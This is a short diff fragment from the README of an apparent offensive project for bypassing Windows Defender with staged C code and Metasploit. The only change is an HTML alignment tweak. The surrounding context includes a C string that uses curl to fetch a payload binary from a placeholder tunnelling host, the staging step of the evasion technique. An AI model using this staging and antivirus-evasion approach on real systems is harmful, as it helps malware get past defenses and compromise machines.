@@ -50,6 +50,6 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
    char *command = "curl https://yourServer.serveo.net/payload.bin";
 ```
 
-<p align="center">
+<p align="start">
    <img src="https://github.com/HaxL0p4/Bypass-Windows-Defender/blob/main/command_variable.png">
 </p>
